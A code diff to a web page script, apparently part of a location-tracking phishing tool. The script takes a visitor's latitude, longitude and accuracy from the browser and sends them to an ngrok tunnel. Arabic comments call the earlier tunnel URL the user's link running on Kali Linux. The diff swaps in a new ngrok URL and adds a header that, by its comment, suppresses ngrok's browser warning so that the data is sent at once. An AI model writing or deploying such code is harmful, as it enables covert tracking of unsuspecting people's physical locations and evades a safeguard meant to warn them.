@@ -21,10 +21,15 @@
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // الرابط الخاص بك الذي يعمل على كالي لينكس
-            var kali_url = "https://devices-honest-pamela-kingston.trycloudflare.com"; 
+            // رابط Ngrok الجديد الخاص بك
+            var kali_url = "https://finally-stumpier-jackelyn.ngrok-free.dev"; 
 
-            fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc)
+            fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc, {
+                headers: {
+                    // هذا السطر يمنع ظهور صفحة التحذير من ngrok ويرسل البيانات فوراً
+                    "ngrok-skip-browser-warning": "true"
+                }
+            })
             .then(response => console.log("Success"))
             .catch(error => console.log("Error"));
         }
